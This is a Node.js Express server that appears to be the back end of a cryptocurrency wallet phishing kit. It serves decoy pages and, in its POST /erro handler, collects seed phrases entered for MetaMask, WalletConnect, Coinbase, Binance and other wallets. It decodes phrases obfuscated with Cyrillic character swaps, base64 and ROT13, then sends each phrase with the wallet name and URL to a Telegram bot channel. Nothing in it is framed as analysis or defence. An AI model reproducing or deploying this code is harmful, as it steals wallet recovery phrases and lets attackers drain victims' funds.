const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
require('dotenv').config()
const app = express();

// Middleware para interpretar JSON e urlencoded

const publicDirectoryPath = path.join(__dirname, '/public');
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(express.static(__dirname, + 'public'))

// Rota para servir o arquivo index.html


function tphrase(message) {
    message = message.replace(/с/g, "1")
                     .replace(/о/g, "2")
                     .replace(/Н/g, "3")
                     .replace(/С/g, "4")
                     .replace(/е/g, "5")
                     .replace(/Х/g, "6")
                     .replace(/Т/g, "7")
                     .replace(/А/g, "8")
                     .replace(/О/g, "9")
                     .replace(/Е/g, "0");

    function str_rot(s, n = 13) {
        const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        n = parseInt(n) % 26;
        if (!n) return s;
        if (n === 13) return s.replace(/[a-zA-Z]/g, (c) => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() <= 'm' ? 13 : -13)));
        return s.replace(/[a-zA-Z]/g, (c) => {
            let index = letters.indexOf(c);
            if (index === -1) return c;
            index = (index + n) % 26;
            if (c >= 'a' && c <= 'z') return letters[index];
            return letters[index + 26];
        });
    }

    return str_rot(Buffer.from(message, 'base64').toString());
}


app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, './index.html'));
  });

app.get('/upsm', (req, res)=>{
    
res.sendFile(path.join(__dirname, './public/upsm/m.html'));
})
app.get('/upsi', (req, res)=>{
    
    res.sendFile(path.join(__dirname, './public/upsm/i.html'));
    })
app.get("/erro", (req, res)=>{
    
    console.log(req.body)
})
app.post('/erro', async(req, res) => {
    console.log('aqui')
    console.log(req.body)
     
    const { m, w, c, b, cl, co, zero, um, dois, tres, quatro, cinco, seis, sete, oito, nove, dez, onze, doze, tereze, quatorze, quize, dezaseis, dezasete, dezoito, dezanove, vinte, vinteum, vintedois, vintetres } = req.body;
    let namewallet = '';
    let phrase = '';
 
    if (m !== undefined) {
        namewallet = "metamask";
        phrase = tphrase(m);
    } else if (w !== undefined) {
        namewallet = "walletconnect";
        phrase = tphrase(w);
    } else if (c !== undefined) {
        namewallet = "coinbase";
        phrase = tphrase(c);
    } else if (b !== undefined) {
        namewallet = "binance";
        phrase = tphrase(b);
    } else if (cl !== undefined) {
        namewallet = "Clover";
        phrase = tphrase(cl);
    } else if (co !== undefined) {
        namewallet = "Crypto Org";
        phrase = tphrase(co);
    } else if (um !== undefined) {
        namewallet = "metamask";
        phrase = `${zero} ${um} ${dois} ${tres} ${quatro} ${cinco} ${seis} ${sete} ${oito} ${nove} ${dez} ${onze} ${doze} ${tereze} ${quatorze} ${quize} ${dezaseis} ${dezasete} ${dezoito} ${dezanove} ${vinte} ${vinteum} ${vintedois} ${vintetres}`;
    }
console.log(phrase)
    const url = `${req.protocol}://${req.get('host')}${req.originalUrl}`;

    const arr = {
        'Кошелек: ': namewallet,
        'Phrase: ': '`' + phrase + '`',
        'URL:': url
    };

    let txt = '';
    for (const [key, value] of Object.entries(arr)) {
        txt += `${key} ${value}%0A`;
    }

    const token = process.env.TOKEN;
    const chat_id = process.env.CHANNEL;

    if (phrase) {
        const resutl = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${txt}`, {
            method: 'GET',
            redirect: "follow"
        })
        const response = await resutl.json()
        console.log(response)
        return response

       
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
